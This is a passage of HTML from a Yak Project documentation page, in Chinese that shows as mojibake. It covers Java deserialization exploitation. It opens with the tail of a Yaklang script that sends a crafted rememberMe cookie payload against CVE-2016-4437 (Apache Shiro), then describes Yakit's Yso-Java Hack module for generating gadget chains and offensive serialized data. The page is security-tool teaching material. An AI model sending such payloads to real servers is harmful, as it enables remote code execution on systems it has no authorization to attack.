rememberMe={{params(payload)}}</span></span><span class="token-line" style="color:#393A34"><span class="token plain">`,</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  poc.params({</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;payload&quot;:rememberMe,</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;target&quot;:target,</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  })</span></span><span class="token-line" style="color:#393A34"><span class="token plain">) // å‘é€payload</span></span><span class="token-line" style="color:#393A34"><span class="token plain">str.SplitHTTPHeadersAndBodyFromPacket(rsp)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">log.info(&quot;å‘é€PayloadæˆåŠŸ&quot;)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">log.info(&quot;å“åº”åŒ…: &quot;,string(rsp))</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="866-åœ¨yakit-ä½¿ç”¨yso-java-hack"></a>8.6.6 åœ¨Yakit ä½¿ç”¨Yso-Java Hack<a class="hash-link" href="#866-åœ¨yakit-ä½¿ç”¨yso-java-hack" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="gadgeté¢„è§ˆ"></a>Gadgeté¢„è§ˆ<a class="hash-link" href="#gadgeté¢„è§ˆ" title="Direct link to heading">#</a></h3><p>å¯¹äºåˆå­¦è€…æ¥è¯´ï¼ŒJavaååºåˆ—åŒ–éƒ¨åˆ†çŸ¥è¯†ç‚¹å¯èƒ½å› ä¸ºå­˜åœ¨å¤§é‡çš„Gadgetç›¸å…³ä¿¡æ¯è€Œæˆä¸ºå­¦ä¹ çš„éšœç¢ã€‚Yso-Java Hackæ¨¡å—æ”¯æŒè¾“å‡ºGadgetå†…éƒ¨ç»“æ„ï¼Œè®©å­¦ä¹ è€…èƒ½å¤Ÿæ¸…æ™°åœ°çœ‹åˆ°Gadgetçš„ç»„æˆç»“æ„å’Œå®ç°åŸç†ã€‚</p><p><img alt="img" src="/en/assets/images/cap8-5-1-a26976e3ef5265fae13f70f38e3fe390.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="ç”Ÿæˆ-yaklang-ä»£ç "></a>ç”Ÿæˆ Yaklang ä»£ç <a class="hash-link" href="#ç”Ÿæˆ-yaklang-ä»£ç " title="Direct link to heading">#</a></h3><p>åœ¨ç¼–å†™åºåˆ—åŒ–åˆ©ç”¨è„šæœ¬æ—¶ï¼Œå¯ä»¥é€šè¿‡Yso-Java Hacké…ç½®éœ€è¦çš„Gadgetã€EvilClassç­‰ä¿¡æ¯ï¼Œè‡ªåŠ¨ç”Ÿæˆ Yaklang è„šæœ¬</p><p><img alt="img" src="/en/assets/images/cap8-5-2-8447bc7826fd0d2bba216cff6ca8384a.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="ç”Ÿæˆåºåˆ—åŒ–æ•°æ®-1"></a>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®<a class="hash-link" href="#ç”Ÿæˆåºåˆ—åŒ–æ•°æ®-1" title="Direct link to heading">#</a></h3><p>åœ¨Yakitçš„Yso-Java Hackä¸­å¯ä»¥é€šè¿‡UIé…ç½®å¯¹è±¡ä¿¡æ¯ï¼Œç›´æ¥ç”Ÿæˆå…·æœ‰æ”»å‡»æ€§çš„åºåˆ—åŒ–æ•°æ®</p><p><img alt="img" src="/en/assets/images/cap8-5-3-8c0894109f0284b565a8cdea1b5356a0.png"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/yaklang/docs/yak-basic/cap8-5-java-hack.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_mS5F" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_mt2f"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/en/docs/yak-basic/cap8-4-yaml-poc"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Â« ä½¿ç”¨ YAML ç¼–å†™ PoC</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/en/docs/yakexamples/intro"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">ç« èŠ‚ä»‹ç» Â»</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#861--åŸºç¡€æ¦‚å¿µ-javaååºåˆ—åŒ–" class="table-of-contents__link">8.6.1  åŸºç¡€æ¦‚å¿µ: Javaååºåˆ—åŒ–</a></li><li><a href="#862-åºåˆ—åŒ–å¯¹è±¡æµçš„ç»„æˆ" class="table-of-contents__link">8.6.2 åºåˆ—åŒ–å¯¹è±¡æµçš„ç»„æˆ</a><ul><li><a href="#ç±»æè¿°class-descriptor" class="table-of-contents__link">ç±»æè¿°ï¼šClass Descriptor</a></li><li><a href="#ç±»å‹ç type-codes" class="table-of-contents__link">ç±»å‹ç ï¼š<strong>Type Codes</strong></a></li></ul></li><li><a href="#863-yak-è¯­è¨€ä¸­å¯¹åºåˆ—åŒ–æ•°æ®æµçš„æ“ä½œ" class="table-of-contents__link">8.6.3 Yak è¯­è¨€ä¸­å¯¹åºåˆ—åŒ–æ•°æ®æµçš„æ“ä½œ</a><ul><li><a href="#è§£æåºåˆ—åŒ–å¯¹è±¡" class="table-of-contents__link">è§£æåºåˆ—åŒ–å¯¹è±¡</a></li><li><a href="#ç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡" class="table-of-contents__link">ç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡</a></li><li><a href="#è¾“å‡ºåºåˆ—åŒ–å¯¹è±¡" class="table-of-contents__link">è¾“å‡ºåºåˆ—åŒ–å¯¹è±¡</a></li><li><a href="#yakç”Ÿæˆåˆ©ç”¨é“¾çš„åºåˆ—åŒ–å¯¹è±¡" class="table-of-contents__link">Yakç”Ÿæˆåˆ©ç”¨é“¾çš„åºåˆ—åŒ–å¯¹è±¡</a></li></ul></li><li><a href="#864-javaå­—èŠ‚ç è§£æ" class="table-of-contents__link">8.6.4 Javaå­—èŠ‚ç è§£æ</a><ul><li><a href="#å­—èŠ‚ç è§£æ" class="table-of-contents__link">å­—èŠ‚ç è§£æ</a></li><li><a href="#å­—èŠ‚ç ä¿®æ”¹" class="table-of-contents__link">å­—èŠ‚ç ä¿®æ”¹</a></li><li><a href="#å­—èŠ‚ç ç”Ÿæˆ" class="table-of-contents__link">å­—èŠ‚ç ç”Ÿæˆ</a></li><li><a href="#ç”Ÿæˆåºåˆ—åŒ–æ•°æ®" class="table-of-contents__link">ç”Ÿæˆåºåˆ—åŒ–æ•°æ®</a></li><li><a href="#yakç”Ÿæˆæ¶æ„å­—èŠ‚ç -api" class="table-of-contents__link">Yakç”Ÿæˆæ¶æ„å­—èŠ‚ç  API</a></li></ul></li><li><a href="#865-æµ‹è¯•æ¡ˆä¾‹cve-2016-4437-shiro-ååºåˆ—åŒ–æ¼æ´" class="table-of-contents__link">8.6.5 æµ‹è¯•æ¡ˆä¾‹ï¼š<em>CVE</em>-<em>2016-4437 Shiro ååºåˆ—åŒ–æ¼æ´</em></a><ul><li><a href="#cve-2016-4437-shiro-ååºåˆ—åŒ–æ¼æ´" class="table-of-contents__link"><em>CVE</em>-<em>2016-4437 Shiro ååºåˆ—åŒ–æ¼æ´</em></a></li><li><a href="#ç¼–å†™åˆ©ç”¨è„šæœ¬" class="table-of-contents__link">ç¼–å†™åˆ©ç”¨è„šæœ¬</a></li></ul></li><li><a href="#866-åœ¨yakit-ä½¿ç”¨yso-java-hack" class="table-of-contents__link">8.6.6 åœ¨Yakit ä½¿ç”¨Yso-Java Hack</a><ul><li><a href="#gadgeté¢„è§ˆ" class="table-of-contents__link">Gadgeté¢„è§ˆ</a></li><li><a href="#ç”Ÿæˆ-yaklang-ä»£ç " class="table-of-contents__link">ç”Ÿæˆ Yaklang ä»£ç </a></li><li><a href="#ç”Ÿæˆåºåˆ—åŒ–æ•°æ®-1" class="table-of-contents__link">ç”Ÿæˆåºåˆ—åŒ–æ•°æ®</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container"><div class="div--flex footer__bottom text--center"><div class="footer-logo-copyright-navigation"><div class="margin-bottom--sm"><a class="footer-link" href="/en/"><img src="/en/img/logo.png" alt="My Site Logo" class="themedImage_TMUO themedImage--light_4Vu1 footer__logo"><img src="/en/img/logo.png" alt="My Site Logo" class="themedImage_TMUO themedImage--dark_uzRr footer__logo"></a></div><div class="footer__copyright copyright-style"><a class="footer-a" href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank">Copyright Â© 2025 for Yak Project. äº¬ICPå¤‡17047700å·-3</a></div><div class="link-body"><a class="footer__link-item" href="/docs/intro" target="_blank">å®˜æ–¹æ–‡æ¡£</a><a class="footer__link-item" href="/en/team">å…³äºæˆ‘ä»¬</a></div></div><div class="footer-contact-me"><a href="https://github.com/yaklang/yakit" target="_blank" class="contact-icon-body"><span role="img" aria-label="github" class="anticon anticon-github icon-style github-icon"><svg viewBox="64 64 896 896" focusable="false" data-icon="github" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9a127.5 127.5 0 0138.1 91v112.5c.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></svg></span></a><div class="contact-icon-body"><span role="img" aria-label="wechat" class="anticon anticon-wechat icon-style wechat-icon"><svg viewBox="64 64 896 896" focusable="false" data-icon="wechat" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M690.1 377.4c5.9 0 11.8.2 17.6.5-24.4-128.7-158.3-227.1-319.9-227.1C209 150.8 64 271.4 64 420.2c0 81.1 43.6 154.2 111.9 203.6a21.5 21.5 0 019.1 17.6c0 2.4-.5 4.6-1.1 6.9-5.5 20.3-14.2 52.8-14.6 54.3-.7 2.6-1.7 5.2-1.7 7.9 0 5.9 4.8 10.8 10.8 10.8 2.3 0 4.2-.9 6.2-2l70.9-40.9c5.3-3.1 11-5 17.2-5 3.2 0 6.4.5 9.5 1.4 33.1 9.5 68.8 14.8 105.7 14.8 6 0 11.9-.1 17.8-.4-7.1-21-10.9-43.1-10.9-66 0-135.8 132.2-245.8 295.3-245.8zm-194.3-86.5c23.8 0 43.2 19.3 43.2 43.1s-19.3 43.1-43.2 43.1c-23.8 0-43.2-19.3-43.2-43.1s19.4-43.1 43.2-43.1zm-215.9 86.2c-23.8 0-43.2-19.3-43.2-43.1s19.3-43.1 43.2-43.1 43.2 19.3 43.2 43.1-19.4 43.1-43.2 43.1zm586.8 415.6c56.9-41.2 93.2-102 93.2-169.7 0-124-120.8-224.5-269.9-224.5-149 0-269.9 100.5-269.9 224.5S540.9 847.5 690 847.5c30.8 0 60.6-4.4 88.1-12.3 2.6-.8 5.2-1.2 7.9-1.2 5.2 0 9.9 1.6 14.3 4.1l59.1 34c1.7 1 3.3 1.7 5.2 1.7a9 9 0 006.4-2.6 9 9 0 002.6-6.4c0-2.2-.9-4.4-1.4-6.6-.3-1.2-7.6-28.3-12.2-45.3-.5-1.9-.9-3.8-.9-5.7.1-5.9 3.1-11.2 7.6-14.5zM600.2 587.2c-19.9 0-36-16.1-36-35.9 0-19.8 16.1-35.9 36-35.9s36 16.1 36 35.9c0 19.8-16.2 35.9-36 35.9zm179.9 0c-19.9 0-36-16.1-36-35.9 0-19.8 16.1-35.9 36-35.9s36 16.1 36 35.9a36.08 36.08 0 01-36 35.9z"></path></svg></span></div></div></div></div></footer></div>
<script src="/en/assets/js/runtime~main.00e96540.js"></script>
<script src="/en/assets/js/main.a328d75b.js"></script>
</body>
</html>